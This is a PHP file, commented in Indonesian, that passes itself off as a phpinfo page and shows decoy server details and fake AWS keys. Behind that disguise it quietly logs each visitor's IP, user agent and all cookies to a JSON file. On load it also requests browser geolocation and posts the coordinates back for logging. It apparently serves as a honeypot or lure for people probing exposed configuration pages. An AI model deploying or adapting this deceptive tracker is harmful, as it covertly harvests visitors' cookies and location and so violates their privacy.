<?php
// Nama file log untuk menyimpan data lokasi
$log_file = 'tracker_log.json';

// Fungsi untuk menulis log ke file
function write_log($data) {
    global $log_file;
    // Membaca file log yang ada
    $current_logs = [];
    if (file_exists($log_file)) {
        $current_logs = json_decode(file_get_contents($log_file), true);
    }
    
    // Menambahkan data baru ke array log
    $current_logs[] = $data;
    
    // Menulis data log ke file dalam format JSON
    file_put_contents($log_file, json_encode($current_logs, JSON_PRETTY_PRINT));
}

// Mengambil data dari permintaan POST
$latitude = isset($_POST['latitude']) ? $_POST['latitude'] : 'Unknown';
$longitude = isset($_POST['longitude']) ? $_POST['longitude'] : 'Unknown';
$browser = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Unknown';
$ip = $_SERVER['REMOTE_ADDR'];
$cookie = isset($_COOKIE) ? json_encode($_COOKIE) : 'No Cookies';

// Menyusun data log dalam format JSON
$log_data = [
    'timestamp' => date('d/M/Y:H:i:s O'),
    'ip_address' => $ip,
    'latitude' => $latitude,
    'longitude' => $longitude,
    'user_agent' => $browser,
    'cookies' => $cookie
];

// Menulis data log ke file
write_log($log_data);

// Menampilkan halaman HTML dengan informasi lokasi
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP Information</title>
    <style>
        body {
            font-family: "Courier New", Courier, monospace;
            background-color: #f5f5f5;
            margin: 0;
            padding: 0;
            color: #000;
        }
        .container {
            width: 1000px;
            margin: 0 auto;
            padding: 20px;
            background: #fff;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        h1 {
            font-size: 24px;
            text-align: center;
            border-bottom: 1px solid #ddd;
            padding-bottom: 10px;
            margin-bottom: 20px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
        }
        table, th, td {
            border: 1px solid #ddd;
        }
        th, td {
            padding: 8px;
            text-align: left;
        }
        th {
            background-color: #f4f4f4;
        }
        .info {
            margin-top: 20px;
            padding: 10px;
            border: 1px solid #ddd;
            background: #f9f9f9;
        }
    </style>
    <script>
        function sendLocationData(latitude, longitude) {
            var xhttp = new XMLHttpRequest();
            xhttp.open("POST", "info.php", true);
            xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            xhttp.send("latitude=" + latitude + "&longitude=" + longitude);
        }

        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    sendLocationData(position.coords.latitude, position.coords.longitude);
                }, function(error) {
                    console.error("Geolocation error:", error);
                });
            } else {
                alert("Geolocation is not supported by this browser.");
            }
        }

        window.onload = function() {
            getLocation();
        }
    </script>
</head>
<body>
    <div class="container">
        <h1>PHP Information</h1>
        <table>
            <tr>
                <th colspan="2">PHP Core</th>
            </tr>
            <tr>
                <td>PHP Version</td>
                <td>7.4.3</td>
            </tr>
            <tr>
                <td>Configuration File (php.ini) Path</td>
                <td>/etc/php/7.4/cli/php.ini</td>
            </tr>
            <tr>
                <td>Loaded Configuration File</td>
                <td>/etc/php/7.4/apache2/php.ini</td>
            </tr>
            <tr>
                <td>Server API</td>
                <td>Apache 2.0 Handler</td>
            </tr>
            <tr>
                <td>OS</td>
                <td>Linux</td>
            </tr>
            <tr>
                <td>Memory Limit</td>
                <td>128M</td>
            </tr>
            <tr>
                <td>Post Max Size</td>
                <td>8M</td>
            </tr>
            <tr>
                <td>Upload Max Filesize</td>
                <td>2M</td>
            </tr>
            <tr>
                <td>Display Errors</td>
                <td>On</td>
            </tr>
            <tr>
                <td>Session Save Path</td>
                <td>/var/lib/php/sessions</td>
            </tr>
        </table>
        <table>
            <tr>
                <th colspan="2">Environment</th>
            </tr>
            <tr>
                <td>AWS_KEY</td>
                <td>FAKE_AWS_KEY_12345</td>
            </tr>
            <tr>
                <td>AWS_ID</td>
                <td>FAKE_AWS_ID_67890</td>
            </tr>
            <tr>
                <td>USER</td>
                <td>www-data</td>
            </tr>
            <tr>
                <td>HOME</td>
                <td>/var/www</td>
            </tr>
            <tr>
                <td>LANG</td>
                <td>en_US.UTF-8</td>
            </tr>
            <tr>
                <td>PATH</td>
                <td>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</td>
            </tr>
            <tr>
                <td>SERVER_SOFTWARE</td>
                <td>Apache/2.4.41 (Ubuntu)</td>
            </tr>
        </table>
    </div>
</body>
</html>
